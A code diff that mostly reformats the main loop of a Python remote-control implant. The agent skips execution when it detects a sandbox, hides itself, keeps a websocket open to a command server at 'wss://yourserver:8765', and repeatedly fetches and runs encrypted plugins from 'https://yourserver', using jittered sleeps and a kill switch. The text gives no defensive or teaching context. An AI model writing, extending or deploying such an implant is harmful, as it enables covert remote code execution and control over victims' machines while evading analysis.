@@ -1,16 +1,21 @@
+import base64
+import os
+import random
+import time
+import uuid
 
-import os, time, uuid, json, random, base64
-import threading
-from core.adaptive_channel_manager import send_data, fetch_task
-from memory_loader import load_encrypted_plugin
-from session_memory import log_session_event
 from ghost_daemon import stay_hidden
-from proxy_fallback_check import proxy_check
 from kill_switch import should_terminate
 from sandbox_check import is_sandbox
+from session_memory import log_session_event
+
+from core.adaptive_channel_manager import fetch_task
+from memory_loader import load_encrypted_plugin
+from proxy_fallback_check import proxy_check
 
 AGENT_ID_FILE = "agent_id.txt"
 CONFIG_FILE = "config.json"
+
 
 def generate_agent_id():
     agent_id = str(uuid.uuid4())
@@ -18,10 +23,12 @@ def generate_agent_id():
         f.write(agent_id)
     return agent_id
 
+
 def get_agent_id():
     if os.path.exists(AGENT_ID_FILE):
         return open(AGENT_ID_FILE).read().strip()
     return generate_agent_id()
+
 
 def jitter_sleep(base=10, fuzz=5):
     sleep_time = base + random.uniform(-fuzz, fuzz)
@@ -29,17 +36,23 @@ def jitter_sleep(base=10, fuzz=5):
 
 
 def run_agent_loop():
-    import threading
     import asyncio
+    import threading
+
     from core.ws_client import persistent_ws_loop
-    
+
     if is_sandbox():
         return
     stay_hidden()
     proxy_check()
     agent_id = get_agent_id()
-    
-    ws_thread = threading.Thread(target=lambda: asyncio.run(persistent_ws_loop(agent_id, "wss://yourserver:8765")), daemon=True)
+
+    ws_thread = threading.Thread(
+        target=lambda: asyncio.run(
+            persistent_ws_loop(agent_id, "wss://yourserver:8765")
+        ),
+        daemon=True,
+    )
     ws_thread.start()
     while not should_terminate():
 
@@ -51,10 +64,12 @@ def run_agent_loop():
                 load_encrypted_plugin(plugin_code, agent_id)
             jitter_sleep()
             from plugin_fetcher import fetch_and_run_plugin
+
             fetch_and_run_plugin(agent_id, "https://yourserver")
         except Exception as e:
             log_session_event(agent_id, "ERROR", str(e))
             time.sleep(30)
+
 
 if __name__ == "__main__":
     run_agent_loop()
